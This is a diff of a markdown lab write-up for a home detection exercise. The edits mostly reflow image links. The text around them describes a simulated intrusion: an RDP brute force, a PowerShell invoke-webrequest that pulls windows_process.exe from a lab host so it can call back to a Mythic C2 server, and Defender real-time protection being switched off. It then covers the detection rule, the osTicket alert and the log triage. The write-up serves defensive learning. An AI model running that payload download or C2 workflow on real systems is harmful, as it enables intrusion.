@@ -55,7 +55,9 @@ invoke-webrequest http://172.31.0.14:9999/windows_process.exe -Outfile "C:\Users
 execute the payload and wait for the agent callback on mythic
 ![Pasted image 20261007143330](images/Pasted%20image%2020261007143330.png)
 #### Command and control
-From here we will use our C2 server to send and execute commands, instead of just logging with rdp![Pasted image 20261007143457](images/Pasted%20image%2020261007143457.png)
+From here we will use our C2 server to send and execute commands, instead of just logging with rdp
+![Pasted image 20261007143457](images/Pasted%20image%2020261007143457.png)
+
 The next steps would be running the payload on startup, gathering system info, privilege escalation, lateral movement, etc...
 
 
@@ -74,7 +76,9 @@ This alerts in 2 cases:
 - file/folder exclusion ADDED
 A more adept attacker could know better than to disable rtp raising alarms, and to just exclude the payload. The first part of the rule checks for that.
 
-This results on the alert:![Pasted image 20261007152442](images/Pasted%20image%2020261007152442.png)
+This results on the alert:
+![Pasted image 20261007152442](images/Pasted%20image%2020261007152442.png)
+
 On the actions tab of the alert we want to configure it so it creates a ticket on osTicket, alerting us.
 ```JSON
 {
@@ -88,7 +92,11 @@ On the actions tab of the alert we want to configure it so it creates a ticket o
 ```
 
 
-Ticket #228094![Pasted image 20261007161144](images/Pasted%20image%2020261007161144.png)Discrepancy between time on the alert and on the body happens because the target is using UTC, and other assets use local time (UTC-3).
+Ticket #228094
+
+![Pasted image 20261007161144](images/Pasted%20image%2020261007161144.png)
+
+Discrepancy between time on the alert and on the body happens because the target is using UTC, and other assets use local time (UTC-3).
 
 
 ### Investigation and triage
@@ -110,11 +118,15 @@ apparently there was a login at 14:30:02 from the source_ip: 172.31.0.15, which 
 This also has LogonType 10, which means they logged through rdp.
 
 Also, before that there are dozens of 4625s (failed logins)
+
 `agent.name : "windows-target" and event.code: 4625 and winlog.logon.id : * and source.ip : "172.31.0.15" `
+
 ![Pasted image 20261007155707](images/Pasted%20image%2020261007155707.png)
 
 **defender rtp disabling**
+
 ![Pasted image 20261007160850](images/Pasted%20image%2020261007160850.png)
+
 in this case it was a total rtp disabling indicated by event code 5001.
 
 **payload staging:**
@@ -161,7 +173,6 @@ At 14:32:51 we see this:
 	"TerminalSessionId": "1",
 	"User": "WINDOWS-TARGET\\Administrator"
 	}
-}
 ```
 This is a process creation, some important fields are:
 - `"Image": "C:\\Users\\Administrator\\Downloads\\windows_process.exe"`
@@ -176,7 +187,9 @@ ProcessId, hashes, and logonId could be used for later investigation.
 
 **C2 beaconing**
 Looking for event.code: 3 (network connection) right after this execution we see:
+
 ![Pasted image 20261007153458](images/Pasted%20image%2020261007153458.png)
+
 ```JSON
 "event_data": {
     "DestinationHostname": "-",
